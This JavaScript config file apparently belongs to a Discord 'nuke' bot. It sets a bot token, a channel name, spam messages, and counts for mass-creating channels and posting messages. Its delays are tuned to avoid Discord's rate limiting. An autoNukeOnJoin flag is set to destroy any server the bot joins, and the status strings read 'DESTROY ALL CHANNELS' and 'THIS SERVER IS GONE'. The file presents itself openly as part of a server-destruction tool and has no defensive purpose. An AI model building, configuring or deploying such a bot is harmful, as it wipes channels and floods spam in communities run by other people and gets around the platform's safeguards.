// config.js - All bot configuration in one place
require('dotenv').config();

module.exports = {
    // Bot Settings
    token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
    prefix: '!',
    
    // Nuke Settings
    channelName: 'IMPOSTER-network',
    spamMessage: 'Nuke by Rick ser',
    channelsToCreate: 10,
    messagesPerChannel: 5,
    
    // Delay Settings (milliseconds) - Prevents rate limiting
    delays: {
        delete: 300,      // Delay between channel deletions
        create: 500,       // Delay between channel creations
        spam: 200,         // Delay between messages
        embed: 300         // Delay after embed
    },
    
    // Auto Nuke Settings
    autoNukeOnJoin: true,  // Automatically nuke any server the bot joins
    
    // Server Settings
    port: process.env.PORT || 3000,
    
    // Colors for console logging
    colors: {
        success: '#00ff00',
        error: '#ff0000',
        warning: '#ffff00',
        info: '#00ffff',
        nuke: '#ff0000'
    },
    
    // Bot Status Messages
    statusMessages: [
        '💀 NUKE READY',
        '🔥 IMPOSTER NETWORK',
        '⚡ BY RICK SER',
        '💀 DESTROY ALL CHANNELS'
    ],
    
    // Spam Messages Array (for variety)
    spamMessages: [
        '💀 **Nuke by Rick ser** 💀',
        '🔥 **IMPOSTER NETWORK** 🔥',
        '⚡ **CHANNELS DELETED** ⚡',
        '💀 **THIS SERVER IS GONE** 💀',
        '🔥 **BY RICK SER** 🔥',
        '⚡ **IMPOSTER RULES** ⚡'
    ]
};